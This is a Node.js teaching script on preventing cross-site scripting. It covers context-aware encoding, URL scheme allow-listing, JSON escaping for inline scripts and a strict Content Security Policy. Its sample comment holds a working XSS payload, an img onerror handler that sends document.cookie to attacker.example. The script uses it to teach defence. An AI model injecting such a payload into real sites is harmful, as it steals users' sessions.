// xss-demo.js: why user input must be encoded for the place it's inserted into, and what CSP adds.
//   node xss-demo.js

// A comment submitted by a visitor. If it's inserted into HTML as-is, the browser runs the script
// in the context of your site: it can read the page, act as the logged-in user, and send data away.
const comment = `Nice post! <img src=x onerror="fetch('https://attacker.example/steal?c=' + document.cookie)">`;

// ---- Vulnerable: string concatenation into HTML ------------------------------------------------
const vulnerable = `<div class="comment">${comment}</div>`;
console.log('VULNERABLE HTML:\n ', vulnerable);

// ---- Fixed: HTML-encode the characters that have a meaning in HTML ------------------------------
function escapeHtml(s) {
  return String(s)
    .replaceAll('&', '&amp;')   // first, or the other replacements would be double-encoded
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;');
}
const safe = `<div class="comment">${escapeHtml(comment)}</div>`;
console.log('\nENCODED HTML (displayed as text, never run):\n ', safe);

// ---- The context matters: HTML encoding is NOT enough everywhere ---------------------------------
const website = 'javascript:alert(document.domain)';
console.log('\nA link built from user input:');
console.log('  escaped but still dangerous:', `<a href="${escapeHtml(website)}">my site</a>`);
function safeUrl(u) {
  try {
    const url = new URL(u);
    return ['http:', 'https:'].includes(url.protocol) ? url.href : null;   // allow-list the schemes
  } catch {
    return null;
  }
}
console.log('  allow-listed scheme:        ', safeUrl(website) ?? '(rejected)', '/', safeUrl('https://ada.example/blog'));

// In JavaScript, put data in JSON (and escape "<" so "</script>" can't end the script block):
const data = { name: '</script><script>alert(1)</script>' };
const json = JSON.stringify(data).replaceAll('<', '\\u003c');
console.log('\nData for an inline script:', `<script>const user = ${json};</script>`);

// ---- Content Security Policy: a second line of defense ---------------------------------------
// Even if an injection slips through, a strict CSP stops the browser from running it:
// no inline scripts or event handlers, scripts only from your origin (or with this response's nonce),
// no plugins, no framing by other sites.
import { randomBytes } from 'node:crypto';
const nonce = randomBytes(16).toString('base64');
const csp = [
  "default-src 'self'",
  `script-src 'self' 'nonce-${nonce}'`,
  "object-src 'none'",
  "base-uri 'none'",
  "frame-ancestors 'none'",
  "form-action 'self'",
].join('; ');
console.log('\nContent-Security-Policy:', csp);
console.log(`Allowed inline script: <script nonce="${nonce}">…</script>  (a new random nonce on every response)`);
